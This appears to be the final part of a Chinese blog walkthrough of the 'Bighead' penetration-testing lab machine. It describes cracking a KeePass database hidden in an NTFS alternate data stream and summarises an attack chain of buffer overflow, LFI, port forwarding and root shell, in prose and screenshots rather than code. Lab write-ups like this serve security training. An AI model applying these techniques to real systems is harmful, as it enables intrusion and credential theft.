![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtpdBehKicBNYOUbB4ia8LDCcalQjWqiaHY5lLR20JwSxyW2S0rf0icWLzOQ/640?wx_fmt=png)

这里利用 keepass2john 破解密匙... 报错了，更新了 john 但是还是不行..

试了挺久，我觉得是文件修改名的时候共享文件，文件应该是不完整的状态... 重新去下载试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtichTxhWM8yNbuUX1dedGAia6JA31LzAyiauVZJfpftKlibp5KlnXL63Dog/640?wx_fmt=png)

这里可以利用 MSF 或者别的方法下载 root.txt:Zone.Identifier 文件...

看到靶机上存在 bash.exe 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtMehAmUOcRNEXIhdw6L5WnmsGhHHEKM52FVAVjvBw2viaDtn39oaO5Ug/640?wx_fmt=png)

直接利用 bash.exe 的 cat 转换到另一文件... 这里我真不知道还有多少坑，因为不是限制共享，就是限制哪的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtzmcIkZwEkibfjQhG0BXOicGzIvJZ2TcWPFHdDtA1cg1oQySsT0oufXFw/640?wx_fmt=png)

可以看到，通过 bash.exe 写入的 test 是完整的文件内容... 通过 keepass2john 碰撞出了哈希值... 通过 john 库进行爆破，获得了密码....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtW6EDKxpHgrycDWKuicuaZkMW4mEIqmEGwcj3gFWuuAAIWx6ujx938Uw/640?wx_fmt=png)

选择图片，然后加密码即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtrASl0njexFLUdvHHNVPyPAjvWCWsj5PL2h52M9MW0NvZ8YyduM3ycw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtJkY7Al1VyLOsccJMHZxBU4l7pl0NrZm8H0uLic3h0wxEoIra5ibBnJ6g/640?wx_fmt=png)

可以看到成功获得了 root 信息...

花了我三天的时间，正如官方说的：

Bighead 是一个 “疯狂” 的难度窗口框，用于处理高级二进制利用，注册表枚举，代码检查和 NTFS ADS，Web 服务器的源代码位于 github 上，需要对其进行分析以查找 HEAD 请求中的溢出，可以使用 head spraying 和 EGG 来利用它，从而产生壳，注册表枚举导致 nginx 的十六进制编码密码，该密码用于通过端口转发获取 ssh shell， 在查看 PHP 代码时，发现了一个容易受到 LFI 攻击的文件，该文件被利用来获得 root shell，根标志具有一个 ADS，它是一个 keepass 数据库，使用密钥来破解该密钥以获得最终标志............

学到了思路... 增强了解题的耐心.... 学到了很多东西... 好好总结！！！加油

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台疯狂的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)